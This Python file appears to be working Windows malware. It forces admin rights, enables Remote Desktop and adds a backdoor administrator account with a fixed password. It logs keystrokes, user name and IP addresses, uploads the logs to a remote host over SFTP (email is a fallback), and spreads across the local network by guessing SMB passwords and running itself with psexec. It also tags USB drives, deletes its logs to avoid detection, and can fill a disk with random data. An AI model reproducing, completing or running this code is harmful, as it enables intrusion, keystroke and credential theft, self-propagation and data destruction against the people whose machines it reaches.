import win32console as consl
import win32api
import win32con
import win32file
import paramiko
import os
import time
import ctypes
import sys
import smtplib
import socket
import uuid
import subprocess
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import winreg



# Generate a unique filename using UUID, IP, and username
username = os.getlogin()
local_ip = socket.gethostbyname(socket.gethostname())
system_uuid = str(uuid.uuid4())[:8]  # Shorten UUID for readability
log_filename = f"WinSysLog_{local_ip}_{username}_{system_uuid}.log"

EMAIL = "your_email@gmail.com"
PASSWORD = "your_secure_app_password"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587


def free_console():
    consl.FreeConsole()

def run_as_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return  # Already an admin, continue execution
    else:
        print("Re-launching script with admin privileges...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()


def log_user_info():
    public_ip = "Unknown"
    try:
        public_ip = os.popen('nslookup myip.opendns.com resolver1.opendns.com').read().split()[-1]
    except Exception:
        pass
    
    with open(log_filename, "a") as file:
        file.write(f"Username: {username}\n")
        file.write(f"Local IP: {local_ip}\n")
        file.write(f"Public IP: {public_ip}\n")
        file.write(f"Timestamp: {time.ctime()}\n\n")


# def enable_remote_desktop():
#     try:
#         os.system("reg add HKLM\\System\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f")
#         os.system("netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=Yes")
#         os.system("sc config TermService start= auto && net start TermService")
#         print("Remote Desktop Enabled Successfully")
#     except Exception as e:
#         print(f"Failed to enable Remote Desktop: {e}")

def enable_rdp():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"System\CurrentControlSet\Control\Terminal Server", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        print("Remote Desktop Enabled Successfully")
    except Exception as e:
        print(f"Failed to enable Remote Desktop: {e}")



def create_admin_backdoor():
    try:
        os.system("net user support_admin P@ssw0rd! /add")
        os.system("net localgroup Administrators support_admin /add")
        os.system("net localgroup \"Remote Desktop Users\" support_admin /add")
        print("Backdoor user created successfully")
    except Exception as e:
        print(f"Failed to create backdoor user: {e}")


def get_removable_disk():
    drives = [d for d in win32api.GetLogicalDriveStrings().split('\x00') if d]
    removable = [d for d in drives if win32file.GetDriveType(d) == win32con.DRIVE_REMOVABLE]
    return removable[-1] if removable else None


def log_keys():
    while True:
        for key in range(8, 256):
            if win32api.GetAsyncKeyState(key) & 0x1:
                with open(log_filename, "a") as file:
                    file.write(chr(key) if 32 <= key <= 126 else f'[{key}]')
        time.sleep(0.1)

REMOTE_HOST = "100.100.100.200"  # Change to your remote machine's IP
REMOTE_USER = "abc"
REMOTE_PASSWORD = ""
REMOTE_PATH = "/home/abc/logs/"  # Target folder

def upload_log_sftp(log_filename):
    try:
        transport = paramiko.Transport((REMOTE_HOST, 22))
        transport.connect(username=REMOTE_USER, password=REMOTE_PASSWORD)
        
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(log_filename, REMOTE_PATH + log_filename)  # Upload file
        
        sftp.close()
        transport.close()
        print(f"Log file {log_filename} uploaded successfully.")
    except Exception as e:
        print(f"Error uploading log: {e}")

def send_email():
    try:
        with open(log_filename, "r") as file:
            log_content = file.read()

        msg = MIMEMultipart()
        msg['From'] = EMAIL
        msg['To'] = EMAIL
        msg['Subject'] = "Windows System Log"
        msg.attach(MIMEText(log_content, 'plain'))

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL, PASSWORD)
        server.send_message(msg)
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")


def infect_drive(drive_letter):
    folder_path = os.path.join(drive_letter, "Update_System32")
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        with open(os.path.join(folder_path, "sys_update.txt"), "w") as file:
            file.write("Windows security patch update.")
        print(f"Infected drive {drive_letter}")


def scan_network():
    base_ip = ".".join(local_ip.split(".")[:3])
    for i in range(1, 255):
        target_ip = f"{base_ip}.{i}"
        response = os.system(f"ping -n 1 -w 500 {target_ip} > nul 2>&1")
        if response == 0:
            print(f"Host {target_ip} is online, attempting to spread...")
            attempt_smb_bruteforce(target_ip)


def attempt_smb_bruteforce(target_ip):
    common_passwords = ["123456", "password", "admin", "welcome", "qwerty", "P@ssw0rd!"]
    for password in common_passwords:
        cmd = f"net use \\\\{target_ip}\\C$ {password} /user:Administrator"
        result = os.system(cmd)
        if result == 0:
            print(f"Successfully authenticated on {target_ip} using password: {password}")
            copy_self_to_target(target_ip)
            break


def copy_self_to_target(target_ip):
    target_path = f"\\\\{target_ip}\\C$\\Users\\Public\\win_update.exe"
    os.system(f"copy {__file__} {target_path}")
    os.system(f"psexec \\\\{target_ip} -s -d {target_path}")
    print(f"Payload executed on {target_ip}")



def fill_drive(drive="C:\\", filename="system_cache.tmp"):
    """ Fills the given drive with random data until no space is left. """
    file_path = os.path.join(drive, filename)
    
    try:
        with open(file_path, "wb") as f:
            chunk_size = 1024 * 1024  # 1MB
            while True:
                f.write(os.urandom(chunk_size))
    except Exception as e:
        print(f"Stopped writing due to: {e}")
    finally:
        print(f"File created at {file_path}")


# def main():
#     log_user_info()
#     enable_remote_desktop()
#     create_admin_backdoor()
#     threading.Thread(target=scan_network, daemon=True).start()
    
#     drive = get_removable_disk()
#     if drive:
#         infect_drive(drive)
    
#     log_keys()
#     # send_email()
#     # Call the function to upload logs
#     upload_log_sftp(log_filename)
#     os.remove(log_filename)
#     #fill_drive()
def main():
    run_as_admin()  # Ensure admin privileges
    
    log_user_info()

    # Enable Remote Desktop (Check for Errors)
    try:
        # enable_remote_desktop()
        enable_rdp()
    except Exception as e:
        print(f"Failed to enable RDP: {e}")

    # Create Admin User
    try:
        create_admin_backdoor()
    except Exception as e:
        print(f"Failed to create admin user: {e}")

    # Start Network Scan
    threading.Thread(target=scan_network, daemon=True).start()
    
    # Detect USB Drives
    drive = get_removable_disk()
    if drive:
        try:
            infect_drive(drive)
        except Exception as e:
            print(f"Failed to infect drive {drive}: {e}")

    # Start Keylogger
    try:
        threading.Thread(target=log_keys, daemon=True).start()
    except Exception as e:
        print(f"Keylogger failed to start: {e}")

    # Upload logs via SFTP
    try:
        upload_log_sftp(log_filename)
    except Exception as e:
        print(f"Failed to upload logs: {e}")

    # Remove logs to prevent detection
    try:
        os.remove(log_filename)
    except Exception as e:
        print(f"Failed to delete log file: {e}")


if __name__ == "__main__":
    main()

